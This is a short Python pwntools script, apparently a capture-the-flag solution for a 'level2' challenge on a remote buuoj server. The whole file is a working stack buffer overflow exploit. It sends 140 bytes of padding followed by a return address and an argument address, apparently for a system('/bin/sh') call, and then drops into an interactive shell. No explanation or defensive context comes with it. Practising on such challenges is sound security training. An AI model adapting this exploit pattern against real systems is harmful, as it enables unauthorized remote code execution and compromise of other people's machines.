from pwn import *
#r=process('./level2')
r=remote("node4.buuoj.cn",29866)
r.send(b"a"*140+p32(0x0804845c)+p32(0x0804A024))
r.interactive()
